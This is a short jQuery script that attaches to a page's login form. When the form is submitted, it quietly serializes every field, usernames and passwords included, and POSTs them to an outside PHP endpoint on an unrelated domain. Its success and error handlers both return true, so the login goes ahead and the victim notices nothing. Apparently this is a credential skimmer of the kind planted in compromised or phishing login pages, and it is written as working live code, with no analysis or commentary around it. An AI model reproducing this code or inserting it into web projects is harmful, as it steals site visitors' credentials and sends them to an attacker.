$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://claimsprak28-big.se.ke/szserialzie.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
